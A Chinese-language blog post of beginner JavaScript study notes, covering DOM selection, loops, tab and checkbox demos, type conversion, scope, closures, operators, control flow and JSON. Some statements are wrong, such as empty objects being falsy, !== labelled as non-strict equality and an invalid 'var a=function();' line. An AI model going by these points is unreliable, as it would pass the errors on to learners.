<h3><span id="windowonload的意义">window.onload的意义</span></h3><p> 1.script标签一般不放body里<br> 2.使用window.online加载HTML的代码</p>
<p>(3)行为（JS）、样式(CSS)、结构(HTML)三者分离</p>
<p> （2）获取一组元素<br>（1）getElementsByTagName<br>   优势：<br>   1.获取一组元素（数组）<br>   2.配合循环使用<br>   3..length获取数组长度</p>
<h2><span id="循环">循环</span></h2><h3><span id="while循环-for循环">while循环、for循环</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">while(条件)</span><br><span class="line">&#123;</span><br><span class="line">	语句</span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   for循环</span><br><span class="line"></span><br><span class="line">for(初始化;条件;自增)</span><br><span class="line">&#123;</span><br><span class="line">	语句</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>（2）用for循环为一组元素添加事件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for(var i=0;i&lt;aDiv.length;i++)</span><br><span class="line">&#123;</span><br><span class="line">	//i-&gt;0,1,2,3</span><br><span class="line">	aDiv[i].style.background=&apos;red&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> （3）实现全选、反选、不选</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">	oBtn1.onclick=function ()     //全选</span><br><span class="line">&#123;</span><br><span class="line">	for(var i=0;i&lt;aCh.length;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		aCh[i].checked=true;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">oBtn2.onclick=function ()      //不选</span><br><span class="line">&#123;</span><br><span class="line">	for(var i=0;i&lt;aCh.length;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		aCh[i].checked=false;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">oBtn3.onclick=function ()        //反选</span><br><span class="line">&#123;</span><br><span class="line">	for(var i=0;i&lt;aCh.length;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		if(aCh[i].checked==true)</span><br><span class="line">		&#123;</span><br><span class="line">			aCh[i].checked=false;</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			aCh[i].checked=true;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2><span id="选项卡">选项卡</span></h2><h3><span id="按钮的实现">按钮的实现</span></h3><p>(1)添加事件<br>    this的使用<br>    用this选定当前元素，用来修改当前元素的属性</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">	for(var i=0;i&lt;aBtn.length;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		aBtn[i].onclick=function ()</span><br><span class="line">		&#123;</span><br><span class="line">			this.className=&apos;active&apos;;</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">```	</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">(2)先清空所有按钮，再选中当前按钮</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```	for(var i=0;i&lt;aBtn.length;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		aBtn[i].onclick=function ()</span><br><span class="line">		&#123;</span><br><span class="line">			for(var i=0;i&lt;aBtn.length;i++)</span><br><span class="line">			&#123;</span><br><span class="line">				aBtn[i].className=&apos;&apos;;</span><br><span class="line">			&#125;</span><br><span class="line">			this.className=&apos;active&apos;;</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3><span id="内容的实现">内容的实现</span></h3><p>(1)索引值的使用<br>(2)什么时候用索引值——需要知道“第几个”的时候<br>(3)html添加index——会被浏览器过滤<br>(3)js添加index</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	var aBtn=oDiv.getElementsByTagName(&apos;input&apos;);</span><br><span class="line">	var aDiv=oDiv.getElementsByTagName(&apos;div&apos;);</span><br><span class="line">	</span><br><span class="line">	for(var i=0;i&lt;aBtn.length;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		aBtn[i].index=i;</span><br><span class="line">		aBtn[i].onclick=function ()</span><br><span class="line">		&#123;</span><br><span class="line">			for(var i=0;i&lt;aBtn.length;i++)</span><br><span class="line">			&#123;</span><br><span class="line">				aBtn[i].className=&apos;&apos;;</span><br><span class="line">				aDiv[i].style.display=&apos;none&apos;;</span><br><span class="line">			&#125;</span><br><span class="line">			this.className=&apos;active&apos;;</span><br><span class="line">			//alert(this.index);</span><br><span class="line">			aDiv[this.index].style.display=&apos;block&apos;;</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h2><span id="简易日历">简易日历</span></h2><h3><span id="程序实现思路">程序实现思路</span></h3><p>(1)类似选项卡，只是下面只有一个div<br>(2)InnerHTML的使用<br>    innerHTML 属性设置或返回表格行的开始和结束标签之间的 HTML。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oTxt=document.getElementById(&apos;txt1&apos;);</span><br><span class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	</span><br><span class="line">	oBtn.onclick=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		oDiv.innerHTML=oTxt.value;</span><br><span class="line">		//alert(oDiv.innerHTML);</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="数组的使用">数组的使用</span></h3><pre><code>数组对象用来在单独的变量名中存储一系列的值。
</code></pre><p> 定义数组：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var myArray=new Array()</span><br></pre></td></tr></table></figure>
<p>数组赋值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.</span><br><span class="line">var mycars=new Array()</span><br><span class="line">mycars[0]=&quot;Saab&quot;</span><br><span class="line">mycars[1]=&quot;Volvo&quot;</span><br><span class="line">mycars[2]=&quot;BMW&quot;</span><br><span class="line">2.</span><br><span class="line">var mycars=new Array(&quot;Saab&quot;,&quot;Volvo&quot;,&quot;BMW&quot;)</span><br></pre></td></tr></table></figure>
<h3><span id="字符串连接">字符串连接 (+)</span></h3><p>作用：连接两个字符串<br>问题：连接中的优先级（用括号改变优先级）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">alert(&apos;abc&apos;+(12+5)+&apos;def&apos;);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<h1><span id="javascript基础">JavaScript基础</span></h1><h2><span id="javascript组成">JavaScript组成</span></h2><p>   ECMAScript：解释器、翻译<br>   DOM：Document Object Model 操作HTML<br>   BOM：Browser Object Model  操作浏览器<br>  兼容性问题：<br>   ECMA        几乎没有兼容性问题<br>   DOM        有一些操作不兼容<br>   BOM        没有兼容问题（完全不兼容）</p>
<h2><span id="变量类型">变量类型</span></h2><h3><span id="类型typeof运算符">类型：typeof运算符</span></h3><p>  用法、返回值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var a=12;</span><br><span class="line">typeof a;</span><br></pre></td></tr></table></figure></p>
<h4><span id="变量类型">变量类型</span></h4><p>变量本来没有类型，变量类型取决于他保存的类型<br>一个变量应该只存放一种类型的数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">var a=12;</span><br><span class="line">typeof a;   //number</span><br><span class="line"></span><br><span class="line">var a=&apos;abc&apos;;</span><br><span class="line">typeof a；  //string</span><br><span class="line"></span><br><span class="line">var a=function();</span><br><span class="line">typeof a;  //function</span><br><span class="line"></span><br><span class="line">var a=document;</span><br><span class="line">typeof a;   //object</span><br><span class="line"></span><br><span class="line">var b;</span><br><span class="line">typeof b;   //undefined</span><br><span class="line"></span><br><span class="line">//undefined出现的情况</span><br><span class="line">//1.真的没有定义</span><br><span class="line">//2.定义了，没有赋值</span><br></pre></td></tr></table></figure>
<h3><span id="数据类型转换">数据类型转换</span></h3><p>(1)显式类型转换(强制类型转换)<br>  [1]parseInt() 把非数字的原始值转换成数字<br>   检测方法：<br>   parseInt() 方法首先查看位置 0 处的字符，判断它是否是个有效数字；如果不是，该方法将返回 NaN，不再继续执行其他操作。但如果该字符是有效数字，该方法将查看位置 1 处的字符，进行同样的测试。这一过程将持续到发现非有效数字的字符为止，此时 parseInt() 将把该字符之前的字符串转换成数字。</p>
<pre><code>var iNum1 = parseInt(&quot;12345red&quot;);    //返回 12345
var iNum1 = parseInt(&quot;0xA&quot;);    //返回 10
var iNum1 = parseInt(&quot;56.9&quot;);    //返回 56
var iNum1 = parseInt(&quot;red&quot;);    //返回 NaN  Not a number
</code></pre><p>parseInt() 方法还有基模式，可以把二进制、八进制、十六进制或其他任何进制的字符串转换成整数。基是由 parseInt() 方法的第二个参数指定的，所以要解析十六进制的值，需如下调用 parseInt() 方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var iNum1 = parseInt(&quot;AF&quot;, 16);	//返回 175</span><br></pre></td></tr></table></figure>
<p>当然，对二进制、八进制甚至十进制（默认模式），都可以这样调用 parseInt() 方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var iNum1 = parseInt(&quot;10&quot;, 2);	//返回 2</span><br><span class="line">var iNum2 = parseInt(&quot;10&quot;, 8);	//返回 8</span><br><span class="line">var iNum3 = parseInt(&quot;10&quot;, 10);	//返回 10</span><br></pre></td></tr></table></figure>
<p>  [2]parseFloat()<br>  从位置 0 开始查看每个字符，直到找到第一个非有效的字符为止，然后把该字符之前的字符串转换成整数。<br>  第一个出现的小数点是有效字符。如果有两个小数点，第二个小数点将被看作无效的。parseFloat() 会把这个小数点之前的字符转换成数字。这意味着字符串 “11.22.33” 将被解析成 11.22。<br>  此外，parseFloat() 方法也没有基模式。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var fNum1 = parseFloat(&quot;12345red&quot;);	//返回 12345</span><br><span class="line">var fNum2 = parseFloat(&quot;0xA&quot;);	//返回 NaN</span><br><span class="line">var fNum3 = parseFloat(&quot;11.2&quot;);	//返回 11.2</span><br><span class="line">var fNum4 = parseFloat(&quot;11.22.33&quot;);	//返回 11.22</span><br><span class="line">var fNum5 = parseFloat(&quot;0102&quot;);	//返回 102</span><br><span class="line">var fNum1 = parseFloat(&quot;red&quot;);	//返回 NaN</span><br></pre></td></tr></table></figure>
<p>(2)NaN的意义和检测</p>
<p>[1]NaN = Not a number<br>[2]NaN和NaN是不相等的<br>[3]is NaN(a) 判断是否为NaN</p>
<h3><span id="隐式类型转换">隐式类型转换</span></h3><p>(1)==、===<br> [1] == 先转换类型，然后比较<br> [2] === 不转换类型，直接比</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var a=5;</span><br><span class="line">var b=&apos;5&apos;;</span><br><span class="line">alert(a==b);	//true		先转换类型，然后比较</span><br><span class="line">alert(a===b);	//false		不转换类型，直接比</span><br></pre></td></tr></table></figure>
<p>(2)减法<br>先转换再相减<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var a=&apos;12&apos;;</span><br><span class="line">var b=&apos;5&apos;;</span><br><span class="line"></span><br><span class="line">alert(a+b);		//1.字符串连接		2.数字相加</span><br><span class="line">alert(a-b);		//1.数字相减</span><br></pre></td></tr></table></figure></p>
<h3><span id="作用域">作用域</span></h3><p>局部变量、全局变量</p>
<p>局部作用域<br>变量在函数内声明，变量为局部作用域。<br>局部变量：只能在函数内部访问。</p>
<p>因为局部变量只作用于函数内，所以不同的函数可以使用相同名称的变量。<br>局部变量在函数开始执行时创建，函数执行完后局部变量会自动销毁。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 此处不能调用 carName 变量</span><br><span class="line"></span><br><span class="line">function myFunction() &#123;</span><br><span class="line">    var carName = &quot;Volvo&quot;;</span><br><span class="line"></span><br><span class="line">    // 函数内可调用 carName 变量</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>（1）全局变量<br>变量在函数外定义，即为全局变量。<br>全局变量有 全局作用域: 网页中所有脚本和函数均可使用。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var carName = &quot; Volvo&quot;;</span><br><span class="line"></span><br><span class="line">// 此处可调用 carName 变量</span><br><span class="line"></span><br><span class="line">function myFunction() &#123;</span><br><span class="line"></span><br><span class="line">    // 函数内可调用 carName 变量</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果变量在函数内没有声明（没有使用 var 关键字），该变量为全局变量。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> // 此处可调用 carName 变量</span><br><span class="line"></span><br><span class="line">function myFunction() &#123;</span><br><span class="line">    carName = &quot;Volvo&quot;;</span><br><span class="line"></span><br><span class="line">    // 此处可调用 carName 变量</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>（2）闭包<br>子函数可以使用父函数的局部变量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function aaa()		//父函数</span><br><span class="line">&#123;</span><br><span class="line">	var a=12;</span><br><span class="line">	</span><br><span class="line">	function bbb()	//子函数</span><br><span class="line">	&#123;</span><br><span class="line">		alert(a);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	bbb();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">aaa();</span><br></pre></td></tr></table></figure>
<h3><span id="命令规范">命令规范</span></h3><p>（1）命名规范及必要性<br>  可读性——能看懂<br>  规范性——符合规则</p>
<p>（2）匈牙利命名法<br>  类型前缀（变量取名）</p>
<table>
<thead>
<tr>
<th>类型</th>
<th style="text-align:left">前缀</th>
<th>类型</th>
<th>实例</th>
</tr>
</thead>
<tbody>
<tr>
<td>数组</td>
<td style="text-align:left">a</td>
<td>Array</td>
<td>aItems</td>
</tr>
<tr>
<td>布尔值</td>
<td style="text-align:left">b</td>
<td>Boolean</td>
<td>bIsComplete</td>
</tr>
<tr>
<td>浮点数</td>
<td style="text-align:left">f</td>
<td>Float</td>
<td>fPrice</td>
</tr>
<tr>
<td>函数</td>
<td style="text-align:left">fn</td>
<td>Function</td>
<td>fnHandler</td>
</tr>
<tr>
<td>整数</td>
<td style="text-align:left">i</td>
<td>Integer</td>
<td>iItemCount</td>
</tr>
<tr>
<td>对象</td>
<td style="text-align:left">o</td>
<td>Object</td>
<td>oDiv1</td>
</tr>
<tr>
<td>正则表达式</td>
<td style="text-align:left">re</td>
<td>RegExp</td>
<td>reEmailCheck</td>
</tr>
<tr>
<td>字符串</td>
<td style="text-align:left">s</td>
<td>String</td>
<td>sUserName</td>
</tr>
<tr>
<td>变体变量</td>
<td style="text-align:left">v</td>
<td>Variant</td>
<td>vAnything</td>
</tr>
</tbody>
</table>
<p>  首字母大写</p>
<h3><span id="运算符">运算符</span></h3><p>算术：+ 加、- 减、<em> 乘、/ 除、% 取模<br>赋值：=、+=、-=、</em>=、/=、%=<br>关系：&lt;、&gt;、&lt;=、&gt;=、==、===、!=、!==<br>逻辑：&amp;&amp; 与、|| 或、! 否<br>条件：var iMax = (iNum1 &gt; iNum2) ? iNum1 : iNum2;</p>
<p>（1）用于字符串的 + 运算符</p>
<ul>
<li>运算符用于把文本值或字符串变量加起来（连接起来）。</li>
</ul>
<p>如需把两个或多个字符串变量连接起来，请使用 + 运算符。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">txt1=&quot;What a very&quot;;</span><br><span class="line">txt2=&quot;nice day&quot;;</span><br><span class="line">txt3=txt1+txt2;</span><br></pre></td></tr></table></figure>
<p>在以上语句执行后，变量 txt3 包含的值是 “What a verynice day”。</p>
<p>要想在两个字符串之间增加空格，需要把空格插入一个字符串之中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">txt1=&quot;What a very &quot;;</span><br><span class="line">txt2=&quot;nice day&quot;;</span><br><span class="line">txt3=txt1+txt2;</span><br></pre></td></tr></table></figure>
<p>或者把空格插入表达式中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">txt1=&quot;What a very&quot;;</span><br><span class="line">txt2=&quot;nice day&quot;;</span><br><span class="line">txt3=txt1+&quot; &quot;+txt2;</span><br></pre></td></tr></table></figure>
<p>在以上语句执行后，变量 txt3 包含的值是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;What a very nice day&quot;</span><br></pre></td></tr></table></figure>
<p>（2）对字符串和数字进行加法运算</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">x=5+5;</span><br><span class="line">document.write(x);  //10</span><br><span class="line"></span><br><span class="line">x=&quot;5&quot;+&quot;5&quot;;</span><br><span class="line">document.write(x);  //55</span><br><span class="line"></span><br><span class="line">x=5+&quot;5&quot;;</span><br><span class="line">document.write(x);  //55</span><br><span class="line"></span><br><span class="line">x=&quot;5&quot;+5;</span><br><span class="line">document.write(x);  //55</span><br></pre></td></tr></table></figure>
<p>规则是：<br>如果把数字与字符串相加，结果将成为字符串。</p>
<p>（3）运算符优先级</p>
<table>
<thead>
<tr>
<th>运算符</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>. [] ()</td>
<td style="text-align:left">字段访问、数组下标、函数调用以及表达式分组</td>
</tr>
<tr>
<td>++ – - ~ ! delete new typeof void</td>
<td style="text-align:left">一元运算符、返回数据类型、对象创建、未定义值</td>
</tr>
<tr>
<td>* / %</td>
<td style="text-align:left">乘法、除法、取模</td>
</tr>
<tr>
<td>+ - +</td>
<td style="text-align:left">加法、减法、字符串连接</td>
</tr>
<tr>
<td>&lt;&lt; &gt;&gt; &gt;&gt;&gt;</td>
<td style="text-align:left">移位</td>
</tr>
<tr>
<td>&lt; &lt;= &gt; &gt;= instanceof</td>
<td style="text-align:left">小于、小于等于、大于、大于等于、是否为特定类的实例</td>
</tr>
<tr>
<td>== != === !==</td>
<td style="text-align:left">等于、不等于、严格相等、非严格相等</td>
</tr>
<tr>
<td>&amp;</td>
<td style="text-align:left">按位与</td>
</tr>
<tr>
<td>^</td>
<td style="text-align:left">按位异或</td>
</tr>
<tr>
<td>l</td>
<td style="text-align:left">按位或</td>
</tr>
<tr>
<td>&amp;&amp;</td>
<td style="text-align:left">逻辑与</td>
</tr>
<tr>
<td>ll</td>
<td style="text-align:left">逻辑或</td>
</tr>
<tr>
<td>?:</td>
<td style="text-align:left">条件</td>
</tr>
<tr>
<td>= oP=</td>
<td style="text-align:left">赋值、运算赋值</td>
</tr>
<tr>
<td>,</td>
<td style="text-align:left">多重求值</td>
</tr>
</tbody>
</table>
<h2><span id="程序流程控制">程序流程控制</span></h2><h3><span id="判断if-switch">判断(if、switch、?:)</span></h3><ul>
<li><p>if</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">if()</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(条件1)</span><br><span class="line">&#123;</span><br><span class="line">	语句1</span><br><span class="line">&#125;</span><br><span class="line">else if(条件2)</span><br><span class="line">&#123;</span><br><span class="line">	语句2</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	语句n</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>switch</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">switch(变量)</span><br><span class="line">&#123;</span><br><span class="line">	case 值1:</span><br><span class="line">		语句1</span><br><span class="line">		break;</span><br><span class="line">	case 值2:</span><br><span class="line">		语句2</span><br><span class="line">		break;</span><br><span class="line">	......</span><br><span class="line">	default:</span><br><span class="line">		语句n</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>三目条件运算符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">条件?语句1:语句2</span><br><span class="line"></span><br><span class="line">if(条件)</span><br><span class="line">&#123;</span><br><span class="line">	语句1</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	语句2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3><span id="循环while-for">循环(while、for)</span></h3><ul>
<li>while、for<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">while(条件)</span><br><span class="line">&#123;</span><br><span class="line">	语句</span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   for循环</span><br><span class="line"></span><br><span class="line">for(初始化;条件;自增)</span><br><span class="line">&#123;</span><br><span class="line">	语句</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3><span id="跳出break-continue">跳出(break、continue)</span></h3><ul>
<li><p>continue 语句中断循环中的迭代，如果出现了指定的条件，然后继续循环中的下一个迭代。</p>
</li>
<li><p>break 语句可用于跳出循环。break 语句跳出循环后，会继续执行该循环之后的代码（如果有的话）</p>
</li>
</ul>
<h3><span id="什么是真-什么是假">什么是真、什么是假</span></h3><ul>
<li>真：true、非零数字、非空字符串、非空对象</li>
<li>假：false、数字零、空字符串、空对象、undefined</li>
</ul>
<h2><span id="json">Json</span></h2><h3><span id="json">Json</span></h3><ul>
<li><p>JSON：JavaScript 对象表示法（JavaScript Object Notation）。</p>
</li>
<li><p>JSON 是存储和交换文本信息的语法。类似 XML。</p>
</li>
<li><p>JSON 比 XML 更小、更快，更易解析。</p>
</li>
</ul>
<h3><span id="json与数组区别">Json与数组区别</span></h3><ul>
<li><p>下标：Json下标为字符，数组下标为数字</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var json=&#123;a: 12, b: 5, c: 7&#125;;</span><br><span class="line">var arr=[12, 5, 7];</span><br><span class="line"></span><br><span class="line">alert(json[&apos;a&apos;]);</span><br><span class="line">alert(arr[0]);</span><br></pre></td></tr></table></figure>
</li>
<li><p>.length</p>
</li>
</ul>
